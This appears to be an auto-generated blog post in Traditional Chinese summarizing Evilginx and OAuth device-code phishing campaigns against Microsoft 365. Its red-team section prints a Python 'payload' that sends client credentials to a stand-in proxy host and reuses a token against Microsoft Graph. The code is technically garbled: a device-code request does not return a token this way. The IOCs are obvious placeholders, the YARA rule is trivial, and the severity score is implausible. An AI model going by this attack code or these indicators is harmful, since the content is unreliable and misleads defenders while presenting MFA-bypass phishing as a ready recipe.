---
layout: post
title:  "Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365"
date:   2026-07-13 08:54:35 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Microsoft 365 Phishing 攻擊：利用 Evilginx 代理和 OAuth Device Code 流
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: MFA 繞過和資訊洩露
> * **關鍵技術**: Evilginx 代理、OAuth Device Code 流、AI 助力開發

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 Evilginx 代理和 OAuth Device Code 流繞過 MFA，從而取得 Microsoft 365 帳戶的存取權。
* **攻擊流程圖解**:
  1. 攻擊者建立 Evilginx 代理伺服器
  2. 攻擊者將 OAuth Device Code 流導向 Evilginx 代理伺服器
  3. 受害者輸入 Microsoft 365 帳戶憑證
  4. Evilginx 代理伺服器將憑證轉發給 Microsoft 365 伺服器
  5. Microsoft 365 伺服器返回存取權杖
  6. 攻擊者使用存取權杖存取受害者的 Microsoft 365 帳戶
* **受影響元件**: Microsoft 365、Evilginx 代理伺服器、OAuth Device Code 流

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要建立 Evilginx 代理伺服器和 OAuth Device Code 流
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # Evilginx 代理伺服器設定
    evilginx_server = "http://example.com:8080"
    
    # OAuth Device Code 流設定
    client_id = "your_client_id"
    client_secret = "your_client_secret"
    redirect_uri = "http://example.com/callback"
    
    # 建立 OAuth Device Code 流
    response = requests.post(
        f"{evilginx_server}/oauth2/v2.0/devicecode",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data={
            "client_id": client_id,
            "client_secret": client_secret,
            "redirect_uri": redirect_uri,
        },
    )
    
    # 取得存取權杖
    access_token = response.json()["access_token"]
    
    # 使用存取權杖存取受害者的 Microsoft 365 帳戶
    response = requests.get(
        "https://graph.microsoft.com/v1.0/me",
        headers={"Authorization": f"Bearer {access_token}"},
    )
    
    ```
* **繞過技術**: 攻擊者可以使用 AI 助力開發工具來自動化攻擊流程

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /usr/bin/evilginx |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule evilginx_proxy {
      meta:
        description = "Evilginx 代理伺服器偵測"
        author = "Your Name"
      strings:
        $a = "evilginx" ascii
        $b = "proxy" ascii
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: 封鎖 Evilginx 代理伺服器的 IP 地址和域名，並更新 Microsoft 365 伺服器的安全設定

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Evilginx 代理伺服器**: 一種開源的代理伺服器，允許攻擊者繞過 MFA 和取得受害者的 Microsoft 365 帳戶存取權。
* **OAuth Device Code 流**: 一種 OAuth 2.0 流，允許用戶在沒有瀏覽器的情況下授權應用程式存取其 Microsoft 365 帳戶。
* **AI 助力開發**: 一種使用人工智慧技術來自動化攻擊流程的方法。

## 5. 🔗 參考文獻與延伸閱讀
* [原始報告](https://thehackernews.com/2026/07/misconfigured-server-reveals-three.html)
* [MITRE ATT&CK](https://attack.mitre.org/techniques/T1556/)


